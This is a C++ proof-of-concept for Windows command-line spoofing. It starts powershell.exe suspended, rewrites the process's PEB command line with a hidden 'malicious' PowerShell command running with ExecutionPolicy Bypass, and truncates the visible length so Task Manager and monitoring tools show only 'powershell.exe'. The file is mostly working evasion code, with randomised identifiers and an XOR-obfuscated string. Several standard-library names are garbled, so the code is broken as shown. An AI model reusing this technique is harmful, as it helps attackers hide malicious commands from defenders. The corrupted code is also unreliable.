#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>


#pragma comment(lib, "ntdll.lib")
#ifdef _DEBUG
#endif
#ifdef _DEBUG
#endif
namespace {
char _obf_data_0[] = { 37, 58, 34, 48, 39, 38, 61, 48, 57, 57, 123, 48, 45, 48, 0 };
char* _obf_str_table[] = {
_obf_data_0,
};
char _obf_decode_buffer[4096];
const char* _obf_str(int id) {
char* s = _obf_str_table[id];
int i = 0;
for (; s[i] != 0; ++i) _obf_decode_buffer[i] = s[i] ^ 85;
_obf_decode_buffer[i] = 0;
return _obf_decode_buffer;
}
}
extern "C" NTSTATUS NtReadVirtualMemory(
HANDLE _87PXX2E0,
PVOID _IQQGTMQK,
PVOID _U4GUUU6J,
ULONG _WGCPJ0PP,
PULONG _4Y6GHRVZ
);
extern "C" NTSTATUS NtWriteVirtualMemory(
HANDLE _87PXX2E0,
PVOID _IQQGTMQK,
PVOID _U4GUUU6J,
ULONG _AHCYLJTL,
PULONG _856VTPKE
);
extern "C" NTSTATUS NtResumeThread(
HANDLE _I7H17ET5,
PULONG _DANDTSYL
);
struct CUSTOM_PEB {
BYTE _YXTIDAT3[16];
PVOID _O9TKMNX1;
PVOID _MRRTD4YQ;
PVOID ProcessParameters;
};
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
BYTE _YXTIDAT3[112];
USHORT Length;
USHORT MaximumLength;
PVOID CommandLine;
};
void Debug(const std::wstring& _499M5YA9) {
std::_YDID0G1I << _499M5YA9 << std::endl;
}
void Debug(const std::wstring& _499M5YA9, const std::vector<std::wstring>& _JM9WJVZ8) {
std::wstring _BZRPM15P = _499M5YA9;
for (size_t _7WZVQ0CZ = 0; _7WZVQ0CZ < _JM9WJVZ8.size(); _7WZVQ0CZ++) {
std::wstring _8ND7YM5Q = L"{" + std::to_wstring(_7WZVQ0CZ) + L"}";
size_t _0IJRB9N3 = _BZRPM15P.find(_8ND7YM5Q);
if (_0IJRB9N3 != std::wstring::_0H1Y7R42) {
_BZRPM15P.replace(_0IJRB9N3, _8ND7YM5Q.length(), _JM9WJVZ8[_7WZVQ0CZ]);
}
}
std::_YDID0G1I << _BZRPM15P << std::endl;
}
std::wstring PadRight(const std::wstring& _BDYN8TAP, size_t _QQMC8U8P, wchar_t _LI3PZ7VC) {
if (_BDYN8TAP.length() >= _QQMC8U8P) return _BDYN8TAP;
return _BDYN8TAP + std::wstring(_QQMC8U8P - _BDYN8TAP.length(), _LI3PZ7VC);
}
int main() {
std::wstring _7O5TTJB3 = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
std::wstring _WTFX1IEE = PadRight(L"powershell.exe", _7O5TTJB3.length(), L' ');
Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
Debug(L"[+] Malicious command length: " + std::to_wstring(_7O5TTJB3.length()));
Debug(L"[+] Malicious command: " + _7O5TTJB3);
Debug(L"[+] Spoofed command length: " + std::to_wstring(_WTFX1IEE.length()));
Debug(L"[+] Spoofed command: " + _WTFX1IEE.substr(0, _WTFX1IEE.find_last_not_of(L' ') + 1));
Debug(L"[+] Spoofed command (with padding): " + _WTFX1IEE);
Debug(L"[+] Creating suspended process...");
STARTUPINFOW _BB0K7I32 = { 0 };
_BB0K7I32.cb = sizeof(_BB0K7I32);
SECURITY_ATTRIBUTES _51XIZD9H = { 0 };
_51XIZD9H.nLength = sizeof(_51XIZD9H);
PROCESS_INFORMATION _900RWCTL = { 0 };
Debug(L"[+] Calling CreateProcessW with command: " + _WTFX1IEE);
BOOL _5WPL6KH4 = CreateProcessW(
NULL,
const_cast<LPWSTR>(_WTFX1IEE.c_str()),
&_51XIZD9H,
&_51XIZD9H,
FALSE,
CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
NULL,
L"C:\\windows\\",
&_BB0K7I32,
&_900RWCTL
);
if (!_5WPL6KH4) {
DWORD _TY8P2X6E = GetLastError();
Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(_TY8P2X6E));
return 1;
}
Debug(L"[+] Process spawned successfully!");
Debug(L"[+] Process ID: " + std::to_wstring(_900RWCTL.dwProcessId));
Debug(L"[+] Thread ID: " + std::to_wstring(_900RWCTL.dwThreadId));
Debug(L"[+] Querying process information...");
PROCESS_BASIC_INFORMATION _C55NAV25 = { 0 };
ULONG _Y0PNMI0L = 0;
NTSTATUS _ZJMBGMY1 = NtQueryInformationProcess(
_900RWCTL.hProcess,
ProcessBasicInformation,
&_C55NAV25,
sizeof(_C55NAV25),
&_Y0PNMI0L
);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
Debug(L"[+] NtQueryInformationProcess successful!");
Debug(L"[+] Return length: " + std::to_wstring(_Y0PNMI0L));
std::wstringstream _JCSAIAR6;
_JCSAIAR6 << std::hex << _C55NAV25.PebBaseAddress;
Debug(L"[+] PEB Address: 0x" + _JCSAIAR6._BDYN8TAP());
Debug(L"[+] Reading PEB structure...");
CUSTOM_PEB _TES8XF1O = { 0 };
SIZE_T _AI3JS2BF = 0;
_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _C55NAV25.PebBaseAddress, &_TES8XF1O, sizeof(_TES8XF1O), (PULONG)&_AI3JS2BF);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
std::wstringstream _ARJ0F3FN;
_ARJ0F3FN << std::hex << _TES8XF1O.ProcessParameters;
Debug(L"[+] ProcessParameters Address: 0x" + _ARJ0F3FN._BDYN8TAP());
Debug(L"[+] Reading ProcessParameters structure...");
CUSTOM_RTL_USER_PROCESS_PARAMETERS _GPX4PVIE = { 0 };
_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _TES8XF1O.ProcessParameters, &_GPX4PVIE, sizeof(_GPX4PVIE), (PULONG)&_AI3JS2BF);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
Debug(L"[+] CommandLine Length: " + std::to_wstring(_GPX4PVIE.Length));
Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(_GPX4PVIE.MaximumLength));
std::wstringstream _AT2WX27C;
_AT2WX27C << std::hex << _GPX4PVIE.CommandLine;
Debug(L"[+] CommandLine Address: 0x" + _AT2WX27C._BDYN8TAP());
Debug(L"[+] Reading original command line...");
std::vector<wchar_t> _A29M4U4L(_GPX4PVIE.Length / sizeof(wchar_t));
_ZJMBGMY1 = NtReadVirtualMemory(_900RWCTL.hProcess, _GPX4PVIE.CommandLine, _A29M4U4L.data(), _GPX4PVIE.Length, (PULONG)&_AI3JS2BF);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
std::wstring _3V49ETNZ(_A29M4U4L.data());
Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(_AI3JS2BF));
Debug(L"[+] Original CommandLine: " + _3V49ETNZ);
Debug(L"[+] Preparing to write malicious command...");
std::vector<wchar_t> _WZX71GX2(_7O5TTJB3.begin(), _7O5TTJB3.end());
Debug(L"[+] New command line length: " + std::to_wstring(_WZX71GX2.size()));
Debug(L"[+] New command line size in bytes: " + std::to_wstring(_WZX71GX2.size() * sizeof(wchar_t)));
SIZE_T _ZURFSFQ3 = 0;
_ZJMBGMY1 = NtWriteVirtualMemory(_900RWCTL.hProcess, _GPX4PVIE.CommandLine, _WZX71GX2.data(), _WZX71GX2.size() * sizeof(wchar_t), (PULONG)&_ZURFSFQ3);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(_ZURFSFQ3));
Debug(L"[+] Writing spoofed command length...");
USHORT _ITNXFVME = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(_ITNXFVME));
std::wstringstream _OTCXILAQ;
_OTCXILAQ << std::hex << (ULONG_PTR)((BYTE*)_TES8XF1O.ProcessParameters + 112);
Debug(L"[+] Writing to address: 0x" + _OTCXILAQ._BDYN8TAP());
_ZJMBGMY1 = NtWriteVirtualMemory(_900RWCTL.hProcess, (PVOID)((BYTE*)_TES8XF1O.ProcessParameters + 112), &_ITNXFVME, sizeof(_ITNXFVME), (PULONG)&_ZURFSFQ3);
if (_ZJMBGMY1 != 0) {
Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
return 1;
}
Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(_ZURFSFQ3));
Debug(L"[+] SPOOFING COMPLETE!");
Debug(L"[+] Process will now show as: powershell.exe");
Debug(L"[+] But will actually execute: " + _7O5TTJB3);
Debug(L"[+] Resuming suspended process...");
ULONG _9U2H3H9J = 0;
_ZJMBGMY1 = NtResumeThread(_900RWCTL.hThread, &_9U2H3H9J);
if (_ZJMBGMY1 == 0) {
Debug(L"[+] Process resumed successfully!");
Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(_ZJMBGMY1));
Debug(L"[+] Previous suspend count: " + std::to_wstring(_9U2H3H9J));
} else {
Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(_ZJMBGMY1));
}
Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
Debug(L"Press a key to end PoC...");
std::_YOLVWNIQ.get();
Debug(L"[+] Cleaning up handles...");
CloseHandle(_900RWCTL.hProcess);
CloseHandle(_900RWCTL.hThread);
Debug(L"[+] Cleanup complete!");
return 0;
}